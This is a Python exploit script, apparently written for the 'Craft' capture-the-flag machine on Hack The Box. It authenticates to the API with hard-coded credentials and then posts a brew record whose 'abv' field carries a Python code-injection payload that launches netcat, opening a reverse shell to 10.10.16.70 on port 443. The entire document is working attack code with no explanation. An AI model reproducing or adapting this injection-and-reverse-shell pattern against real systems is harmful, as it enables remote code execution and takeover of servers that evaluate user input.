#!/usr/bin/env python
 
import requests
import json
 
response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
json_response = json.loads(response.text)
token =  json_response['token']
 
headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }
 
print("Spwaning a reverse shell on port 443...")
brew_dict = {}
brew_dict['abv'] = '__import__("os").system("nc 10.10.16.70 443 -e /bin/sh &amp;") #'
brew_dict['name'] = 'bullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style'] = 'bullshit'
 
json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print("Done!")
